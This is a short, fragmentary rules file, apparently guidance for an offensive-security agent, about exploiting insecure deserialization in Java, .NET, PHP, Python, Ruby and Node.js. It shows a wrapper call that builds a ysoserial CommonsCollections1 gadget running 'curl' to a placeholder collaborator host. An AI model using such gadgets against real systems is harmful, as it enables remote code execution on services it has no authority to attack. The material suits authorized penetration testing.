---
description: 不安全反序列化——Java (ysoserial)、.NET (ViewState / TextFormattingRunProperties)、PHP (POP)、Python (pickle / PyYAML)、Ruby (Marshal)、Node.js (node-serialize / JSON revivers)。当 cookie / 隐藏字段 / Authorization 出现序列化 blob 或 Content-Type 显示魔字节时载入。
globs:
---
...
Operator-side: `generate_deserialization_gadget(target='java', chain='CommonsCollections1', command='curl http://COLLABORATOR')` — Valravn's wrapper around ysoserial (W1 wave).
...
- `generate_deserialization_gadget(target='java', chain=...)` — Valravn's ysoserial wrapper (W1)
